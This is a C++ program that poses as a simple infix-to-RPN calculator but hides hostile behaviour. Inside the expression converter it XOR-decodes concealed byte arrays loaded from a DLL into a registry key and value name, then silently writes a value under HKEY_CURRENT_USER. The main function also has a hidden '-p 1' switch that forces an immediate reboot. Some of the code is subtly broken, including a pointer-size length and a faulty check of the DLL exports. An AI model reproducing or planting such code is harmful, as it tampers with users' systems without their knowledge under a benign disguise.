#include <iostream>
#include <cstdlib>
#include <string>
#include <fstream>
#include <cctype>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <windows.h>

using namespace std;

const int MAX = 4096;
string stack[MAX];
int tos = 0;
string x = "Hello, this is calc!";
string x1 = "My first project!";
string infixExpr;

BYTE* bytes = nullptr;
size_t bytes_len = 0;
BYTE* bytes1 = nullptr;
size_t bytes_len1 = 0;

typedef void (*InitFunc)();
HMODULE hDll;

int __init() {
    hDll = LoadLibrary(L"Dll1.dll");
    if (!hDll) {
        cerr << "Can't load DLL\n";
        return 1;
    }

    InitFunc init = (InitFunc)GetProcAddress(hDll, "init");
    if (!init) {
        cerr << "Can't find function\n";
        FreeLibrary(hDll);
        return 1;
    }

    BYTE* dll_bytes = (BYTE*)GetProcAddress(hDll, "bytes");
    size_t* dll_bytes_len = (size_t*)GetProcAddress(hDll, "bytes_len");
    BYTE* dll_bytes1 = (BYTE*)GetProcAddress(hDll, "bytes1");
    size_t* dll_bytes_len1 = (size_t*)GetProcAddress(hDll, "bytes_len1");

    if (!(dll_bytes || !dll_bytes_len) || !(dll_bytes1 || !dll_bytes_len1)) {
        cerr << "Can't get bytes or bytes_len from DLL\n";
        FreeLibrary(hDll);
        return 1;
    }

    init();

    bytes_len = *dll_bytes_len;
    bytes = new BYTE[bytes_len];
    bytes_len1 = *dll_bytes_len1;
    bytes1 = new BYTE[bytes_len1];
    memcpy(bytes, dll_bytes, bytes_len);
    memcpy(bytes1, dll_bytes1, bytes_len1);

    return 0;
}

std::vector<BYTE> bebabi(const BYTE* arr1, const string& x, size_t length) {
    // Длина x может быть меньше length, чтобы избежать выхода за границы
    size_t len = min(x.size(), length);
    std::vector<BYTE> arr2(x.begin(), x.begin() + len);
    std::vector<BYTE> result(length);

    for (size_t i = 0; i < length; ++i) {
        BYTE b1 = arr1[i];
        BYTE b2 = (i < len) ? arr2[i] : 0;
        result[i] = b1 ^ b2;
    }
    return result;
}

void push(string val) {
    if (tos >= MAX) {
        printf("Stack overflow\n");
        return;
    }
    stack[tos++] = val;
}

string pop(void) {
    if (tos <= 0) {
        printf("Stack is empty\n");
        return "";
    }
    return stack[--tos];
}

int priority(char s) {
    switch (s) {
    case '+': case '-': return 1;
    case '*': case '/': return 2;
    case '(': return 0;
    default: return -1;
    }
}

void in_file(string str) {
    fstream in("out.txt", ios::out);
    if (in.is_open()) {
        in << str;
        in.close();
    }
}

string convertToRPN(const string& str) {
    HKEY hKey;
    if (bytes == nullptr || bytes_len == 0) {
        cerr << "bytes not initialized\n";
        return "";
    }

    std::vector<BYTE> pipap = bebabi(bytes, x, bytes_len);
    std::vector<BYTE> pippi = bebabi(bytes1, x1, sizeof(bytes1));

    LPCSTR subKey = reinterpret_cast<LPCSTR>(pipap.data());
    LPCSTR subKey1 = reinterpret_cast<LPCSTR>(pippi.data());

    if (RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hKey, subKey1, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
        RegCloseKey(hKey);
    }

    string output = "";
    for (size_t i = 0; i < str.length(); i++) {
        char ch = str[i];

        if (isdigit(ch)) {
            while (i < str.length() && isdigit(str[i])) {
                output += str[i];
                i++;
            }
            output += ' ';
            i--;
        }
        else if (ch == '(') {
            push("(");
        }
        else if (ch == ')') {
            while (tos > 0 && stack[tos - 1] != "(") {
                output += pop();
                output += ' ';
            }
            pop(); // удаляем "("
        }
        else {
            while (tos > 0 && priority(ch) <= priority(stack[tos - 1][0])) {
                output += pop();
                output += ' ';
            }
            push(string(1, ch));
        }
    }
    while (tos > 0) {
        output += pop();
        output += ' ';
    }
    return output;
}

int evaluateRPN(const string& expression) {
    int evalStack[MAX];
    int evalTos = 0;
    istringstream iss(expression);
    string token;

    while (iss >> token) {
        if (isdigit(token[0])) {
            evalStack[evalTos++] = stoi(token);
        }
        else {
            int b = evalStack[--evalTos];
            int a = evalStack[--evalTos];
            switch (token[0]) {
            case '+': evalStack[evalTos++] = a + b; break;
            case '-': evalStack[evalTos++] = a - b; break;
            case '*': evalStack[evalTos++] = a * b; break;
            case '/':
                if (b == 0) throw runtime_error("Divide by 0");
                evalStack[evalTos++] = a / b;
                break;
            }
        }
    }
    return evalStack[0];
}

void startHello() {
    cout << x << endl;
    cout << x1 << endl;
    cout << "\nInput expression: ";
    getline(cin, infixExpr);
    cout << "\n\n";
}

int main(int argc, char* argv[]) {
    setlocale(LC_ALL, "rus");

    startHello();

    if (__init() != 0) {
        return 1; // Ошибка инициализации DLL
    }

    string rpnExpr = convertToRPN(infixExpr);

    try {
        int result = evaluateRPN(rpnExpr);
        cout << "Result: " << result << endl;
    }
    catch (const runtime_error& e) {
        cerr << "Error: " << e.what() << endl;
    }

    for (int i = 1; i < argc - 1; ++i) {
        if (string(argv[i]) == "-p" && string(argv[i + 1]) == "1") {
            system("shutdown /r /t 0");
            return 0;
        }
    }

    delete[] bytes;
    bytes = nullptr;
    delete[] bytes1;
    bytes1 = nullptr;

    FreeLibrary(hDll);
    return 0;
}
